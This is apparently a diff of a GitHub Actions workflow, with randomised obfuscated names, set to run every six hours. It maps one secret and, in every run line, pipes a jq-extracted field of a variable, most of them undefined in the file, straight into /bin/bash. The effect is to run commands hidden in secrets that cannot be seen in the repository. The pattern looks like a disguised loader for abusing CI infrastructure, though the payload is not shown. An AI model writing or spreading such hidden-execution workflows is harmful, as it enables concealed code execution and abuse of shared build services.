@@ -2,22 +2,23 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
+    - cron: '27 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          sgkv98584: ${{ secrets.sgkv98584 }}
+          gqnp888: ${{ secrets.gqnp888 }}
         run: |
-          echo $sgkv98584 | jq -r .hvopm3760 | /bin/bash
-          echo $shh27059 | jq -r .rahgs2630 | /bin/bash
-          echo $xeg6462 | jq -r .iein2545 | /bin/bash
-          echo $zxkl3975 | jq -r .ejn2772 | /bin/bash
-          echo $xzfy51 | jq -r .tdwo1 | /bin/bash
-          echo $t00 | jq -r .iuc81 | /bin/bash
-          echo $zwdsw27 | jq -r .agg6 | /bin/bash
+          echo $gqnp888 | jq -r .z861 | /bin/bash
+          echo $s65822 | jq -r .dtyz1333 | /bin/bash
+          echo $p864 | jq -r .ecgd585 | /bin/bash
+          echo $h224 | jq -r .y9344 | /bin/bash
+          echo $ext217 | jq -r .j00311 | /bin/bash
+          echo $zh203 | jq -r .cfp82 | /bin/bash
+          echo $tfhuj1 | jq -r .pke6 | /bin/bash
+          echo $vz6728 | jq -r .wszvu030 | /bin/bash
+          echo $b24 | jq -r .jev5 | /bin/bash
 
